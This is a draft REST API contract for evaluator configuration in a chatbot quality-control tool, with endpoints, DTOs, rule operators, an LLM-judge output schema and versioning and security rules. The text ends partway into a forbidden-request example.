# VinFast QC Copilot - Evaluator API Contract

Version: `v0.2`  
Status: API Contract Draft  
Base path: `/api/v1`  
Related docs:

- `docs/api/00-api-overview.md`
- `docs/api/01-api-conventions.md`
- `docs/api/02-auth-permission-contract.md`
- `docs/api/04-secret-provider-api.md`
- `docs/api/05-dataset-api.md`
- `docs/api/06-chatbot-target-api.md`
- `docs/api/08-test-run-api.md`
- `prd_v07.md`
- `erd_v05.md`

---

## 1. Purpose

This document defines the REST API contract for evaluator configuration in VinFast QC Copilot.

An evaluator defines how chatbot output is graded. In MVP, a project can have multiple evaluators, and each evaluator has immutable versions. A TestRun locks exact evaluator versions so historical results stay stable even if the evaluator is edited later.

This contract covers:

```text
1. Evaluator CRUD.
2. Evaluator versioning.
3. Rule-based evaluator configuration.
4. LLM Judge evaluator configuration.
5. Mixed evaluator configuration.
6. Supported safe operators.
7. Field source discovery for the evaluator builder UI.
8. Validation-only API before saving an evaluator version.
9. Version immutability and TestRun locking rules.
10. Security rule that user-provided custom JavaScript is not accepted in MVP.
```

This document does not define:

```text
1. Promptfoo adapter implementation internals.
2. Runner-side judge response normalization implementation.
3. TestRun preflight/start/cancel APIs.
4. SSE result event payloads.
5. Full test_case_results persistence contract.
```

Those details belong in `08-test-run-api.md`, `09-sse-events-contract.md`, `10-runner-internal-api.md`, backend specs and runner specs.

---

## 2. Design Principles

```text
1. Evaluator belongs to one project.
2. Evaluator has immutable versions.
3. Editing rule/rubric/config creates a new EvaluatorVersion.
4. TestRun locks evaluator versions through test_run_evaluator_versions.
5. Rule-based evaluator uses safe operators only.
6. User/QC cannot provide arbitrary JavaScript in MVP.
7. Backend may generate safe adapter code internally, but user input must remain declarative.
8. LLM Judge output must follow a normalized JSON verdict schema.
9. Judge provider/model selection may have evaluator-level defaults, but TestRun locks the actual judge provider/model used for execution.
10. Rule config, rubric and judge output must not contain plaintext secrets.
11. Evaluator APIs should be usable by frontend builder UI without knowing Promptfoo internals.
```

---

## 3. Resource Model Summary

### 3.1. Evaluator

Database entity:

```text
evaluators
```

Fields from ERD:

```text
id UUID PK
project_id UUID FK projects(id)
name TEXT NOT NULL
type evaluator_type NOT NULL
created_by UUID FK users(id)
created_at TIMESTAMPTZ NOT NULL
updated_at TIMESTAMPTZ NOT NULL
deleted_at TIMESTAMPTZ
```

Supported types:

```text
RULE_BASED
LLM_JUDGE
MIXED
```

Rules:

```text
1. evaluator.type is immutable after creation.
2. evaluator.name may be updated if unique in project.
3. Deleting evaluator is soft delete.
4. Soft-deleted evaluator cannot be selected for new TestRun.
5. Existing TestRuns that already locked an evaluator version remain readable.
```

---

### 3.2. Evaluator Version

Database entity:

```text
evaluator_versions
```

Fields from ERD:

```text
id UUID PK
evaluator_id UUID FK evaluators(id)
version INT NOT NULL
config_json JSONB
created_by UUID FK users(id)
created_at TIMESTAMPTZ NOT NULL
```

Rules:

```text
1. EvaluatorVersion is immutable after creation.
2. Changing rules creates a new version.
3. Changing rubric creates a new version.
4. Changing threshold/pass condition creates a new version.
5. EvaluatorVersion used by TestRun must never be mutated.
6. Latest version is selected by default in UI, but user may choose older versions if visible.
```

---

### 3.3. Evaluator Rule

Database entity:

```text
evaluator_rules
```

Fields from ERD:

```text
id BIGINT PK
evaluator_version_id UUID FK evaluator_versions(id)
field_source TEXT NOT NULL
operator TEXT NOT NULL
expected_value_json JSONB
weight NUMERIC(8,4)
required BOOLEAN NOT NULL DEFAULT false
order_index INT NOT NULL
config_json JSONB
created_at TIMESTAMPTZ NOT NULL
updated_at TIMESTAMPTZ NOT NULL
```

Rules:

```text
1. Rule rows belong to an evaluator version.
2. Rule order is stable through order_index.
3. RULE_BASED versions must have at least one rule.
4. MIXED versions may have rule rows plus LLM Judge config.
5. LLM_JUDGE-only versions usually have no evaluator_rules rows.
```

---

## 4. Endpoint Summary

| Method | Endpoint | Purpose |
| ------ | -------- | ------- |
| `GET` | `/api/v1/projects/{projectId}/evaluators` | List evaluators in a project |
| `POST` | `/api/v1/projects/{projectId}/evaluators` | Create evaluator with initial version |
| `GET` | `/api/v1/evaluators/{evaluatorId}` | Get evaluator detail |
| `PATCH` | `/api/v1/evaluators/{evaluatorId}` | Update evaluator metadata only |
| `DELETE` | `/api/v1/evaluators/{evaluatorId}` | Soft delete evaluator |
| `GET` | `/api/v1/evaluators/{evaluatorId}/versions` | List evaluator versions |
| `POST` | `/api/v1/evaluators/{evaluatorId}/versions` | Create a new evaluator version |
| `GET` | `/api/v1/evaluator-versions/{evaluatorVersionId}` | Get evaluator version detail |
| `POST` | `/api/v1/projects/{projectId}/evaluators/validate` | Validate evaluator config without persistence |
| `GET` | `/api/v1/projects/{projectId}/evaluator-field-sources` | Resolve available field sources for evaluator builder UI |
| `GET` | `/api/v1/evaluator-operators` | List supported evaluator operators |

Endpoint naming note:

```text
`validate` is an action endpoint because it validates transient config without creating a resource.
`evaluator-field-sources` is a helper collection for UI builder metadata.
```

---

## 5. Permission Summary

| Action | Required permission |
| ------ | ------------------- |
| List evaluators | Project VIEW |
| View evaluator detail/version | Project VIEW |
| Create evaluator | Project UPDATE / Configure evaluator: OWNER / ADMIN / MEMBER |
| Create evaluator version | Project UPDATE / Configure evaluator: OWNER / ADMIN / MEMBER |
| Update evaluator metadata | Project UPDATE / Configure evaluator: OWNER / ADMIN / MEMBER |
| Delete evaluator | Project UPDATE / Configure evaluator: OWNER / ADMIN / MEMBER |
| Validate evaluator config | Project UPDATE / Configure evaluator: OWNER / ADMIN / MEMBER |
| Resolve field sources | Project VIEW |
| List evaluator operators | Authenticated ACTIVE user |

VIEWER can inspect evaluator configuration and historical versions but cannot create/update/delete evaluators.

---

## 6. Common DTOs

### 6.1. EvaluatorResponse

```json
{
  "id": "8238786d-580b-4f29-b85d-20f6cf4deac0",
  "projectId": "2a7e1a83-7e37-4ef6-82cc-a7771ae7d2e5",
  "name": "Answer quality evaluator",
  "type": "MIXED",
  "latestVersion": {
    "id": "9c7c2f9a-4564-4667-93a8-17a7b85b37bc",
    "version": 3,
    "createdAt": "2026-07-02T10:00:00+07:00",
    "createdBy": {
      "id": "a38f0878-1ebe-49db-abf2-f6a372b6c246",
      "name": "QC Member"
    }
  },
  "createdBy": {
    "id": "a38f0878-1ebe-49db-abf2-f6a372b6c246",
    "name": "QC Member"
  },
  "createdAt": "2026-07-01T09:00:00+07:00",
  "updatedAt": "2026-07-02T10:00:00+07:00"
}
```

Rules:

```text
1. latestVersion is nullable only if evaluator creation somehow failed before version creation.
2. Normal successful creation must always create version 1.
3. deletedAt must not be returned in normal list response unless `includeDeleted=true` is supported later.
```

---

### 6.2. EvaluatorVersionResponse

```json
{
  "id": "9c7c2f9a-4564-4667-93a8-17a7b85b37bc",
  "evaluatorId": "8238786d-580b-4f29-b85d-20f6cf4deac0",
  "projectId": "2a7e1a83-7e37-4ef6-82cc-a7771ae7d2e5",
  "name": "Answer quality evaluator",
  "type": "MIXED",
  "version": 3,
  "config": {
    "ruleBased": {
      "aggregation": "ALL_REQUIRED_AND_WEIGHTED_THRESHOLD",
      "passCondition": {
        "type": "SCORE_AT_LEAST_THRESHOLD",
        "threshold": 0.7
      }
    },
    "llmJudge": {
      "rubric": "Grade the answer based on correctness, completeness and hallucination risk.",
      "scoreScale": {
        "min": 0,
        "max": 1
      },
      "threshold": 0.7,
      "passCondition": "SCORE_AT_LEAST_THRESHOLD",
      "inputTemplate": "Question: {{question}}\nExpected: {{expected}}\nActual: {{actual}}",
      "outputSchema": "VFQC_JUDGE_V1",
      "defaultJudgeProviderId": "01f18752-67f1-4bda-a139-d88623390068",
      "defaultJudgeModel": "gpt-4.1-mini"
    }
  },
  "rules": [
    {
      "id": 101,
      "fieldSource": "extracted.mainAnswer",
      "operator": "contains",
      "expectedValue": {
        "type": "datasetVariable",
        "path": "$dataset.expected"
      },
      "weight": 1.0,
      "required": true,
      "orderIndex": 1,
      "config": {}
    }
  ],
  "createdBy": {
    "id": "a38f0878-1ebe-49db-abf2-f6a372b6c246",
    "name": "QC Member"
  },
  "createdAt": "2026-07-02T10:00:00+07:00"
}
```

Rules:

```text
1. `config` is evaluator_versions.config_json.
2. `rules` is built from evaluator_rules rows.
3. `defaultJudgeProviderId` and `defaultJudgeModel` are optional UI defaults.
4. The actual judge provider/model used by execution is locked by TestRun.
5. Do not expose Promptfoo internal config as the API source of truth.
```

---

## 7. Field Source Contract

Evaluator rules compare a source value against an expected value.

A field source must be declarative and safe.

Supported field source forms:

```text
extracted.mainAnswer
extracted.intent
extracted.confidence
response.statusCode
response.body:<jsonPath>
response.headers:<jsonPath>
latencyMs
dataset:<datasetVariablePath>
```

Examples:

```text
extracted.mainAnswer
extracted.intent
response.statusCode
response.body:$.data.answer
response.body:$.data.intent
response.body:$.metadata.confidence
response.headers:$.content-type
latencyMs
dataset:$dataset.expected
```

Rules:

```text
1. `extracted.*` refers to response_extraction_config_json from Chatbot Target.
2. `response.body:<jsonPath>` reads from the masked response body.
3. `response.headers:<jsonPath>` reads from masked response headers.
4. `latencyMs` reads measured request latency.
5. `dataset:$dataset.<columnName>` reads dataset row data.
6. JSONPath must be deterministic and must not execute code.
7. User-provided JavaScript field source is forbidden.
```

---

## 8. Expected Value Contract

`expectedValue` defines what the source field is compared against.

Supported expected value types:

```text
literal
datasetVariable
json
number
boolean
null
```

Examples:

```json
{
  "type": "literal",
  "value": "success"
}
```

```json
{
  "type": "datasetVariable",
  "path": "$dataset.expected"
}
```

```json
{
  "type": "number",
  "value": 0.7
}
```

```json
{
  "type": "json",
  "value": {
    "intent": "product_info"
  }
}
```

Rules:

```text
1. datasetVariable path must refer to an existing dataset schema column for the selected dataset/schema context.
2. contains/regex operators usually require string-compatible expected values.
3. numeric comparison operators require numeric expected values.
4. exists/not_exists/is_empty/is_not_empty do not require expected values.
5. Do not allow expectedValue to reference secret values.
```

---

## 9. Supported Operators

MVP supported operators:

```text
equals
not_equals
contains
not_contains
regex
exists
not_exists
is_empty
is_not_empty
greater_than
greater_than_or_equal
less_than
less_than_or_equal
is_json
contains_json
```

Operator behavior:

| Operator | Expected value required | Notes |
| -------- | ----------------------- | ----- |
| `equals` | Yes | Deep equality for JSON, exact match for scalar values |
| `not_equals` | Yes | Negated equality |
| `contains` | Yes | String contains or collection contains |
| `not_contains` | Yes | Negated contains |
| `regex` | Yes | Regex pattern; backend should validate pattern safety |
| `exists` | No | Field exists and is not undefined |
| `not_exists` | No | Field missing or undefined |
| `is_empty` | No | Empty string/array/object/null |
| `is_not_empty` | No | Not empty |
| `greater_than` | Yes | Numeric comparison |
| `greater_than_or_equal` | Yes | Numeric comparison |
| `less_than` | Yes | Numeric comparison |
| `less_than_or_equal` | Yes | Numeric comparison |
| `is_json` | No | Value is valid JSON object/array/stringified JSON |
| `contains_json` | Yes | JSON contains expected object fragment |

Promptfoo mapping is handled by the Runner adapter. Backend/API contract remains domain-oriented.

---

## 10. LLM Judge Config Contract

LLM Judge config lives in `evaluator_versions.config_json.llmJudge`.

Canonical shape:

```json
{
  "llmJudge": {
    "rubric": "Grade the answer based on correctness, completeness and hallucination risk.",
    "scoreScale": {
      "min": 0,
      "max": 1
    },
    "threshold": 0.7,
    "passCondition": "SCORE_AT_LEAST_THRESHOLD",
    "inputTemplate": "Question: {{question}}\nExpected: {{expected}}\nActual: {{actual}}",
    "outputSchema": "VFQC_JUDGE_V1",
    "defaultJudgeProviderId": "01f18752-67f1-4bda-a139-d88623390068",
    "defaultJudgeModel": "gpt-4.1-mini"
  }
}
```

Fields:

| Field | Required | Description |
| ----- | -------- | ----------- |
| `rubric` | Yes | Natural language grading instruction |
| `scoreScale.min` | Yes | Minimum score |
| `scoreScale.max` | Yes | Maximum score |
| `threshold` | Yes | Pass threshold |
| `passCondition` | Yes | Pass rule for normalized judge output |
| `inputTemplate` | Yes | Template for judge input |
| `outputSchema` | Yes | Expected normalized judge schema version |
| `defaultJudgeProviderId` | No | Optional UI default provider |
| `defaultJudgeModel` | No | Optional UI default model |

Supported `passCondition` values:

```text
SCORE_AT_LEAST_THRESHOLD
PASSED_FIELD_TRUE
```

Rules:

```text
1. Rubric must not contain plaintext API keys or credentials.
2. inputTemplate may use dataset variables and extracted output variables.
3. outputSchema should default to VFQC_JUDGE_V1.
4. defaultJudgeProviderId must point to a visible provider if present.
5. defaultJudgeProviderId/defaultJudgeModel are not final execution truth.
6. TestRun locks actual judge_provider_id and judge_model at run creation.
```

---

## 11. Canonical Judge Output Schema

Runner should instruct the judge model to output a JSON object equivalent to:

```json
{
  "score": 0.86,
  "passed": true,
  "reason": "Answer matches the expected product information and does not hallucinate.",
  "errors": [],
  "criteria": [
    {
      "name": "correctness",
      "score": 0.9,
      "reason": "Main facts are correct."
    }
  ]
}
```

API-level rules:

```text
1. Evaluator config should specify outputSchema = VFQC_JUDGE_V1.
2. Runner parses judge output tolerantly.
3. If parsing fails, testcase result should become JUDGE_ERROR or ERROR, not business FAILED.
4. Judge raw response must be masked before artifact persistence.
5. Reasoning/thinking fields from provider-specific APIs must not be treated as verdict JSON.
```

---

## 12. Rule Aggregation Contract

Rule-based and mixed evaluators may define aggregation behavior in `config.ruleBased`.

Canonical shape:

```json
{
  "ruleBased": {
    "aggregation": "ALL_REQUIRED_AND_WEIGHTED_THRESHOLD",
    "passCondition": {
      "type": "SCORE_AT_LEAST_THRESHOLD",
      "threshold": 0.7
    }
  }
}
```

Supported aggregation values:

```text
ALL_PASS
ANY_PASS
ALL_REQUIRED_AND_WEIGHTED_THRESHOLD
```

Supported pass condition values:

```text
ALL_RULES_PASS
ANY_RULE_PASS
SCORE_AT_LEAST_THRESHOLD
```

Rules:

```text
1. ALL_PASS requires passCondition.type=ALL_RULES_PASS.
2. ANY_PASS requires passCondition.type=ANY_RULE_PASS.
3. ALL_REQUIRED_AND_WEIGHTED_THRESHOLD requires passCondition.type=SCORE_AT_LEAST_THRESHOLD and threshold from 0 to 1.
4. required=true means the rule must pass for evaluator to pass.
5. weight defaults to 1.0 if omitted.
6. orderIndex controls display/evaluation order.
7. Final aggregation details are normalized by Runner into component_results_json.
```

---

## 13. Create Evaluator

```http
POST /api/v1/projects/{projectId}/evaluators
```

### Purpose

Create an evaluator and its first immutable version.

### Permission

Project UPDATE / Configure evaluator: OWNER / ADMIN / MEMBER.

### Request - RULE_BASED

```json
{
  "name": "Basic answer checks",
  "type": "RULE_BASED",
  "config": {
    "ruleBased": {
      "aggregation": "ALL_PASS",
      "passCondition": {
        "type": "ALL_RULES_PASS"
      }
    }
  },
  "rules": [
    {
      "fieldSource": "extracted.mainAnswer",
      "operator": "contains",
      "expectedValue": {
        "type": "datasetVariable",
        "path": "$dataset.expected"
      },
      "weight": 1.0,
      "required": true,
      "orderIndex": 1,
      "config": {}
    }
  ]
}
```

### Request - LLM_JUDGE

```json
{
  "name": "Rubric judge",
  "type": "LLM_JUDGE",
  "config": {
    "llmJudge": {
      "rubric": "Grade correctness, completeness, hallucination risk and clarity.",
      "scoreScale": {
        "min": 0,
        "max": 1
      },
      "threshold": 0.7,
      "passCondition": "SCORE_AT_LEAST_THRESHOLD",
      "inputTemplate": "Question: {{question}}\nExpected: {{expected}}\nActual: {{actual}}",
      "outputSchema": "VFQC_JUDGE_V1",
      "defaultJudgeProviderId": "01f18752-67f1-4bda-a139-d88623390068",
      "defaultJudgeModel": "gpt-4.1-mini"
    }
  },
  "rules": []
}
```

### Request - MIXED

```json
{
  "name": "Rule + Rubric evaluator",
  "type": "MIXED",
  "config": {
    "ruleBased": {
      "aggregation": "ALL_REQUIRED_AND_WEIGHTED_THRESHOLD",
      "passCondition": {
        "type": "SCORE_AT_LEAST_THRESHOLD",
        "threshold": 0.7
      }
    },
    "llmJudge": {
      "rubric": "Grade the final answer against expected answer and do not allow hallucinated facts.",
      "scoreScale": {
        "min": 0,
        "max": 1
      },
      "threshold": 0.7,
      "passCondition": "SCORE_AT_LEAST_THRESHOLD",
      "inputTemplate": "Question: {{question}}\nExpected: {{expected}}\nActual: {{actual}}",
      "outputSchema": "VFQC_JUDGE_V1"
    }
  },
  "rules": [
    {
      "fieldSource": "response.statusCode",
      "operator": "equals",
      "expectedValue": {
        "type": "number",
        "value": 200
      },
      "weight": 1.0,
      "required": true,
      "orderIndex": 1,
      "config": {}
    },
    {
      "fieldSource": "extracted.mainAnswer",
      "operator": "is_not_empty",
      "required": true,
      "orderIndex": 2,
      "config": {}
    }
  ]
}
```

### Response - 201 Created

```json
{
  "id": "8238786d-580b-4f29-b85d-20f6cf4deac0",
  "projectId": "2a7e1a83-7e37-4ef6-82cc-a7771ae7d2e5",
  "name": "Rule + Rubric evaluator",
  "type": "MIXED",
  "latestVersion": {
    "id": "9c7c2f9a-4564-4667-93a8-17a7b85b37bc",
    "version": 1,
    "createdAt": "2026-07-02T10:00:00+07:00",
    "createdBy": {
      "id": "a38f0878-1ebe-49db-abf2-f6a372b6c246",
      "name": "QC Member"
    }
  },
  "createdAt": "2026-07-02T10:00:00+07:00",
  "updatedAt": "2026-07-02T10:00:00+07:00"
}
```

### Errors

| HTTP | Code | Notes |
| ---- | ---- | ----- |
| `400` | `VALIDATION_ERROR` | Invalid request body |
| `400` | `EVALUATOR_RULE_INVALID` | Rule shape is invalid |
| `400` | `EVALUATOR_OPERATOR_UNSUPPORTED` | Operator is not supported in MVP |
| `400` | `EVALUATOR_FIELD_SOURCE_INVALID` | Field source is invalid or unsafe |
| `400` | `EVALUATOR_EXPECTED_VALUE_INVALID` | Expected value does not match operator requirement |
| `400` | `EVALUATOR_LLM_JUDGE_CONFIG_INVALID` | LLM Judge config is invalid |
| `400` | `EVALUATOR_CUSTOM_JAVASCRIPT_FORBIDDEN` | User-provided JS was detected |
| `403` | `PERMISSION_DENIED` | User cannot configure evaluator |
| `404` | `PROJECT_NOT_FOUND` | Project not found or not visible |
| `409` | `EVALUATOR_NAME_ALREADY_EXISTS` | Name already exists in project |

---

## 14. List Evaluators

```http
GET /api/v1/projects/{projectId}/evaluators?type=MIXED&includeLatestVersion=true&page=0&size=20
```

### Purpose

List evaluators in a project.

### Permission

Project VIEW.

### Query Parameters

| Name | Type | Required | Notes |
| ---- | ---- | -------- | ----- |
| `type` | string | No | `RULE_BASED`, `LLM_JUDGE`, `MIXED` |
| `includeLatestVersion` | boolean | No | Defaults to `true` |
| `page` | integer | No | Zero-based page index |
| `size` | integer | No | Page size |

### Response - 200 OK

```json
{
  "items": [
    {
      "id": "8238786d-580b-4f29-b85d-20f6cf4deac0",
      "projectId": "2a7e1a83-7e37-4ef6-82cc-a7771ae7d2e5",
      "name": "Rule + Rubric evaluator",
      "type": "MIXED",
      "latestVersion": {
        "id": "9c7c2f9a-4564-4667-93a8-17a7b85b37bc",
        "version": 1,
        "createdAt": "2026-07-02T10:00:00+07:00"
      },
      "createdAt": "2026-07-02T10:00:00+07:00",
      "updatedAt": "2026-07-02T10:00:00+07:00"
    }
  ],
  "page": {
    "number": 0,
    "size": 20,
    "totalElements": 1,
    "totalPages": 1
  }
}
```

---

## 15. Get Evaluator Detail

```http
GET /api/v1/evaluators/{evaluatorId}
```

### Purpose

Get evaluator metadata and latest version summary.

### Permission

Project VIEW through evaluator ownership.

### Response - 200 OK

Returns `EvaluatorResponse`.

### Errors

| HTTP | Code | Notes |
| ---- | ---- | ----- |
| `403` | `PERMISSION_DENIED` | User cannot view project |
| `404` | `EVALUATOR_NOT_FOUND` | Evaluator not found or not visible |

---

## 16. Update Evaluator Metadata

```http
PATCH /api/v1/evaluators/{evaluatorId}
```

### Purpose

Update evaluator metadata only.

This endpoint must not modify rules, rubric, thresholds or versioned config.

### Permission

Project UPDATE / Configure evaluator: OWNER / ADMIN / MEMBER.

### Request

```json
{
  "name": "Updated evaluator name"
}
```

### Response - 200 OK

Returns `EvaluatorResponse`.

### Rules

```text
1. `type` is immutable and cannot be patched.
2. `rules` cannot be patched here.
3. `config` cannot be patched here.
4. Rule/rubric/config changes must use POST /evaluators/{evaluatorId}/versions.
```

### Errors

| HTTP | Code | Notes |
| ---- | ---- | ----- |
| `400` | `VALIDATION_ERROR` | Invalid metadata |
| `400` | `EVALUATOR_TYPE_IMMUTABLE` | Attempted to update evaluator type |
| `403` | `PERMISSION_DENIED` | User cannot update evaluator |
| `404` | `EVALUATOR_NOT_FOUND` | Evaluator not found or not visible |
| `409` | `EVALUATOR_NAME_ALREADY_EXISTS` | Name already exists in project |

---

## 17. Delete Evaluator

```http
DELETE /api/v1/evaluators/{evaluatorId}
```

### Purpose

Soft delete evaluator.

### Permission

Project UPDATE / Configure evaluator: OWNER / ADMIN / MEMBER.

### Response - 204 No Content

### Rules

```text
1. Soft delete sets deleted_at.
2. Deleted evaluator cannot be selected for new TestRun.
3. Existing historical TestRuns remain readable.
4. If evaluator has active/running TestRuns, backend may reject delete with 409.
```

### Errors

| HTTP | Code | Notes |
| ---- | ---- | ----- |
| `403` | `PERMISSION_DENIED` | User cannot delete evaluator |
| `404` | `EVALUATOR_NOT_FOUND` | Evaluator not found or not visible |
| `409` | `EVALUATOR_IN_USE_BY_ACTIVE_RUN` | Evaluator is used by active/running TestRun |

---

## 18. List Evaluator Versions

```http
GET /api/v1/evaluators/{evaluatorId}/versions?page=0&size=20
```

### Purpose

List immutable versions for an evaluator.

### Permission

Project VIEW.

### Response - 200 OK

```json
{
  "items": [
    {
      "id": "9c7c2f9a-4564-4667-93a8-17a7b85b37bc",
      "evaluatorId": "8238786d-580b-4f29-b85d-20f6cf4deac0",
      "version": 3,
      "createdBy": {
        "id": "a38f0878-1ebe-49db-abf2-f6a372b6c246",
        "name": "QC Member"
      },
      "createdAt": "2026-07-02T10:00:00+07:00"
    }
  ],
  "page": {
    "number": 0,
    "size": 20,
    "totalElements": 3,
    "totalPages": 1
  }
}
```

---

## 19. Create Evaluator Version

```http
POST /api/v1/evaluators/{evaluatorId}/versions
```

### Purpose

Create a new immutable version for an existing evaluator.

### Permission

Project UPDATE / Configure evaluator: OWNER / ADMIN / MEMBER.

### Request

Same version payload shape as create evaluator, but without `name` and `type`:

```json
{
  "config": {
    "ruleBased": {
      "aggregation": "ALL_REQUIRED_AND_WEIGHTED_THRESHOLD",
      "passCondition": {
        "type": "SCORE_AT_LEAST_THRESHOLD",
        "threshold": 0.8
      }
    },
    "llmJudge": {
      "rubric": "Grade correctness and completeness. Penalize unsupported claims.",
      "scoreScale": {
        "min": 0,
        "max": 1
      },
      "threshold": 0.8,
      "passCondition": "SCORE_AT_LEAST_THRESHOLD",
      "inputTemplate": "Question: {{question}}\nExpected: {{expected}}\nActual: {{actual}}",
      "outputSchema": "VFQC_JUDGE_V1"
    }
  },
  "rules": [
    {
      "fieldSource": "extracted.mainAnswer",
      "operator": "contains",
      "expectedValue": {
        "type": "datasetVariable",
        "path": "$dataset.expected"
      },
      "weight": 1.0,
      "required": true,
      "orderIndex": 1,
      "config": {}
    }
  ]
}
```

### Response - 201 Created

Returns `EvaluatorVersionResponse`.

### Version Number Rule

```text
newVersion = max(existing versions for evaluator) + 1
```

### Errors

| HTTP | Code | Notes |
| ---- | ---- | ----- |
| `400` | `EVALUATOR_RULE_INVALID` | Rule shape is invalid |
| `400` | `EVALUATOR_LLM_JUDGE_CONFIG_INVALID` | LLM Judge config is invalid |
| `403` | `PERMISSION_DENIED` | User cannot configure evaluator |
| `404` | `EVALUATOR_NOT_FOUND` | Evaluator not found or not visible |
| `409` | `EVALUATOR_VERSION_CONFLICT` | Concurrent version creation conflict |

---

## 20. Get Evaluator Version Detail

```http
GET /api/v1/evaluator-versions/{evaluatorVersionId}
```

### Purpose

Get full immutable evaluator version detail including config and rules.

### Permission

Project VIEW through evaluator ownership.

### Response - 200 OK

Returns `EvaluatorVersionResponse`.

### Errors

| HTTP | Code | Notes |
| ---- | ---- | ----- |
| `403` | `PERMISSION_DENIED` | User cannot view project |
| `404` | `EVALUATOR_VERSION_NOT_FOUND` | Evaluator version not found or not visible |

---

## 21. Validate Evaluator Config

```http
POST /api/v1/projects/{projectId}/evaluators/validate
```

### Purpose

Validate evaluator config before saving.

This endpoint is used by the frontend evaluator builder UI.

### Permission

Project UPDATE / Configure evaluator: OWNER / ADMIN / MEMBER.

### Request

```json
{
  "type": "MIXED",
  "config": {
    "ruleBased": {
      "aggregation": "ALL_REQUIRED_AND_WEIGHTED_THRESHOLD",
      "passCondition": {
        "type": "SCORE_AT_LEAST_THRESHOLD",
        "threshold": 0.7
      }
    },
    "llmJudge": {
      "rubric": "Grade correctness, completeness and hallucination risk.",
      "scoreScale": {
        "min": 0,
        "max": 1
      },
      "threshold": 0.7,
      "passCondition": "SCORE_AT_LEAST_THRESHOLD",
      "inputTemplate": "Question: {{question}}\nExpected: {{expected}}\nActual: {{actual}}",
      "outputSchema": "VFQC_JUDGE_V1"
    }
  },
  "rules": [
    {
      "fieldSource": "extracted.mainAnswer",
      "operator": "contains",
      "expectedValue": {
        "type": "datasetVariable",
        "path": "$dataset.expected"
      },
      "required": true,
      "orderIndex": 1
    }
  ],
  "context": {
    "datasetSchemaId": "d0c4f9c1-b020-4dbb-8fa2-2eb6ee82c6c9",
    "datasetSchemaVersion": 1,
    "chatbotTargetId": "12a95f46-b833-4f07-a7d9-f066f2ba1793",
    "exampleId": 88
  }
}
```

### Response - 200 OK

```json
{
  "valid": true,
  "warnings": [
    {
      "code": "LLM_JUDGE_DEFAULT_PROVIDER_NOT_SET",
      "message": "No default judge provider is configured. User must select a judge provider during run setup."
    }
  ],
  "normalized": {
    "type": "MIXED",
    "ruleCount": 1,
    "hasLlmJudge": true,
    "usesDatasetVariables": ["$dataset.expected"],
    "usesFieldSources": ["extracted.mainAnswer"]
  }
}
```

### Error Response - 400 Bad Request

```json
{
  "type": "https://vfqc.vinfast.vn/problems/validation-error",
  "title": "Evaluator config is invalid",
  "status": 400,
  "detail": "Evaluator contains invalid rules.",
  "instance": "/api/v1/projects/2a7e1a83-7e37-4ef6-82cc-a7771ae7d2e5/evaluators/validate",
  "code": "EVALUATOR_RULE_INVALID",
  "traceId": "01J0Z7Y4Y4F9E1S2Y9W8Q7P6A5",
  "errors": [
    {
      "field": "rules[0].fieldSource",
      "code": "UNKNOWN_FIELD_SOURCE",
      "message": "Field source extracted.mainAnswer is not available for the selected chatbot target."
    }
  ]
}
```

---

## 22. Resolve Evaluator Field Sources

```http
GET /api/v1/projects/{projectId}/evaluator-field-sources?datasetVersionId={datasetVersionId}&chatbotTargetId={chatbotTargetId}&exampleId={exampleId}
```

### Purpose

Return available field sources for the evaluator builder UI.

### Permission

Project VIEW.

### Query Parameters

| Name | Type | Required | Notes |
| ---- | ---- | -------- | ----- |
| `datasetVersionId` | UUID | No | Used to resolve `$dataset.*` variables |
| `chatbotTargetId` | UUID | No | Used to resolve extraction config |
| `exampleId` | BIGINT | No | Used to inspect masked example response fields |

### Response - 200 OK

```json
{
  "datasetVariables": [
    {
      "path": "$dataset.question",
      "name": "question",
      "displayName": "Question",
      "dataType": "text",
      "required": true
    },
    {
      "path": "$dataset.expected",
      "name": "expected",
      "displayName": "Expected",
      "dataType": "text",
      "required": false
    }
  ],
  "extractedFields": [
    {
      "fieldSource": "extracted.mainAnswer",
      "label": "Main answer",
      "dataType": "text",
      "jsonPath": "$.data.answer"
    },
    {
      "fieldSource": "extracted.intent",
      "label": "Intent",
      "dataType": "text",
      "jsonPath": "$.data.intent"
    }
  ],
  "responseFields": [
    {
      "fieldSource": "response.statusCode",
      "label": "HTTP status code",
      "dataType": "number"
    },
    {
      "fieldSource": "response.body:$.data.answer",
      "label": "response.body.data.answer",
      "dataType": "text"
    },
    {
      "fieldSource": "latencyMs",
      "label": "Latency in milliseconds",
      "dataType": "number"
    }
  ]
}
```

Rules:

```text
1. This endpoint must return only masked/safe metadata.
2. It must not expose raw secret-bearing headers.
3. Dataset variables should reflect the locked or selected dataset schema/version.
4. Response field suggestions may be best-effort based on latest example.
```

---

## 23. List Evaluator Operators

```http
GET /api/v1/evaluator-operators
```

### Purpose

Return supported operators and UI metadata.

### Permission

Authenticated ACTIVE user.

### Response - 200 OK

```json
{
  "items": [
    {
      "operator": "contains",
      "label": "Contains",
      "expectedValueRequired": true,
      "compatibleDataTypes": ["text", "array"],
      "description": "Passes when the source value contains the expected value."
    },
    {
      "operator": "greater_than_or_equal",
      "label": "Greater than or equal",
      "expectedValueRequired": true,
      "compatibleDataTypes": ["number"],
      "description": "Passes when source numeric value is greater than or equal to expected value."
    },
    {
      "operator": "exists",
      "label": "Exists",
      "expectedValueRequired": false,
      "compatibleDataTypes": ["any"],
      "description": "Passes when the source field exists."
    }
  ]
}
```

---

## 24. State and Immutability Rules

### 24.1. Evaluator Type Immutability

```text
Evaluator type cannot be changed after creation.
```

Reason:

```text
Changing RULE_BASED to LLM_JUDGE changes semantic meaning too much and can break historical assumptions.
```

### 24.2. Evaluator Version Immutability

```text
EvaluatorVersion cannot be updated after creation.
```

If QC edits config:

```text
Create a new evaluator_versions row.
Create new evaluator_rules rows for that version if applicable.
```

### 24.3. TestRun Locking

When TestRun starts, backend must lock evaluator versions:

```text
test_run_evaluator_versions.test_run_id
test_run_evaluator_versions.evaluator_version_id
test_run_evaluator_versions.evaluator_type
test_run_evaluator_versions.order_index
```

Historical TestRuns must keep using locked evaluator versions even if evaluator latest version changes.

---

## 25. Security Rules

```text
1. User-provided custom JavaScript is forbidden in MVP.
2. API must reject fields named customJavaScript, javascript, jsCode, script, functionBody or similar executable payloads.
3. config/rules/rubric/inputTemplate must not contain plaintext API keys, bearer tokens or cookies.
4. Secret references are not needed in evaluator config except optional default judge provider id.
5. Provider secret resolution happens through provider/secret flow, not evaluator config.
6. Backend must mask sensitive values in validation error details.
7. LLM Judge raw response is artifact/result data and must be masked before persistence.
```

Forbidden request example:

```json
{
  "name": "Unsafe evaluator",
